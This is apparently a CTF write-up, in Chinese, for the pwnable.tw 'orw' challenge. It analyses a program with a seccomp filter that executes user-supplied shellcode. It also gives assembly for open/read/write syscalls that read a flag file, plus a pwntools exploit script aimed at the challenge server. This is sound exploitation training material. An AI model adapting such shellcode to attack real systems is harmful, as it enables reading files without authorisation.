---
title: "Pwnable Orw wp"
date: 2026-09-10 00:00:00 +0800
last_modified_at: 2026-09-10 00:00:00 +0800
categories: [CTF, Pwnable]
tags: [Pwn]
description: "Pwnable wp"
media_subpath: /assets/img/posts/Pwnable-Start-wp
image:
  path: Pwnable.png
  alt: Pwnable wp
---

## 格式
file：
```
orw: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e60ecccd9d01c8217387e8b77e9261a1f36b5030, not stripped
```

Syscall table：
https://x86.syscall.sh/

## 防禦機制
checksec：
```bash
[*] '/home/hamichi/pwn/orw'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

seccomp-tools：
```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```

## 分析
 Disassembly：
```
08048548    int32_t main(int32_t argc, char** argv, char** envp)

08048548  8d4c2404           lea     ecx, [esp+0x4 {argc}]
0804854c  83e4f0             and     esp, 0xfffffff0
0804854f  ff71fc             push    dword [ecx-0x4 {__return_addr}] {__return_addr_1}
08048552  55                 push    ebp {__saved_ebp}
08048553  89e5               mov     ebp, esp {__saved_ebp}
08048555  51                 push    ecx {argc} {var_c}
08048556  83ec04             sub     esp, 0x4
08048559  e86dffffff         call    orw_seccomp
0804855e  83ec0c             sub     esp, 0xc
08048561  68a0860408         push    data_80486a0 {var_20}  {"Give my your shellcode:"}
08048566  e815feffff         call    printf
0804856b  83c410             add     esp, 0x10
0804856e  83ec04             sub     esp, 0x4
08048571  68c8000000         push    0xc8 {var_18}
08048576  6860a00408         push    shellcode {var_1c}
0804857b  6a00               push    0x0 {var_20}
0804857d  e8eefdffff         call    read
08048582  83c410             add     esp, 0x10
08048585  b860a00408         mov     eax, shellcode
⚠️0804858a  ffd0               call    eax  {shellcode}
0804858c  b800000000         mov     eax, 0x0
08048591  8b4dfc             mov     ecx, dword [ebp-0x4]
08048594  c9                 leave    {__saved_ebp}
08048595  8d61fc             lea     esp, [ecx-0x4]
08048598  c3                 retn    


```

Decompilation：
```c++
08048548    int32_t main(int32_t argc, char** argv, char** envp)

0804854f        void* const __return_addr_1 = __return_addr
08048555        int32_t* var_c = &argc
08048559        orw_seccomp()
08048566        printf(format: "Give my your shellcode:")
0804857d        read(fd: 0, buf: &shellcode, nbytes: 0xc8)
⚠️0804858a        (&shellcode)()
08048598        return 0


```

這題有使用 `seccomp` 限制可以使用的指令，這題只能使用 `ORW` 建立 `shellcode`，而這題只是寫`shellcode`而已xD，在 `⚠️0804858a (&shellcode)()` 就會把我們寫的 `shellcode` 跑起來了

## 利用
如何建置 `shellcode`，我們先看我們需要做甚麼：
1. 打開 flag
> `EAX`：`5`
> `EBX`：`const char *filename`
> `ECX`：存放開啟模式旗標
> `EDX`：存放檔案權限
```
mov eax,0x5
push 0x6761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80
```
2. 讀取 flag
> `EAX`：`3`
> `EBX`：`fd`
> `ECX`：`buf addr`
> `EDX`：`size`
```
mov ebx,eax
mov eax,0x3
mov edx,0x40
mov ecx,esp
int 0x80
```

3. 輸出 flag
> `EAX`：`4`
> `EBX`：`fd`
> `ECX`：`buf addr`
> `EDX`：`size`
```
mov ebx,1
mov eax,0x4
int 0x80
```

Exploit：
```python
from pwn import *

#r = process("./orw")
r = remote("chall.pwnable.tw", 10001)

r.recvuntil(b"Give my your shellcode:")


playload = asm("""
    mov eax,0x5
    push 0x6761
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    mov ebx,esp
    xor ecx,ecx
    xor edx,edx
    int 0x80

    mov ebx,eax
    mov eax,0x3
    mov edx,0x40
    mov ecx,esp
    int 0x80

    mov ebx,1
    mov eax,0x4
    int 0x80
"""
)

r.sendline(playload)
r.interactive()
```

   
